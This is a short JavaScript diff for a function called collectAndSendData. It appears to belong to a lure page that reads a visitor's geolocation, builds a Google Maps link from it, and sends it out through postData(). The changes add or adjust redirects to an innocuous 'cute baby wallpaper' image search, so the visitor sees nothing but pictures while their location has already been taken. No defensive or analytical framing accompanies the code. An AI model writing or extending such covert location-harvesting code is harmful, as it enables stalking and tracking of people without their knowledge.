@@ -8,12 +8,14 @@ function collectAndSendData() {
     function (position) {
       const { latitude, longitude } = position.coords;
       data.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+       window.location.href =
+      "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
       postData();
     },
     function () {
       data.mapLink = "Location access denied"; 
        window.location.href =
-      "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
+      "https://www.google.com/search?q=cute+baby+girl+wallpaper+hd&tbm=isch";
        postData();
     },
   );
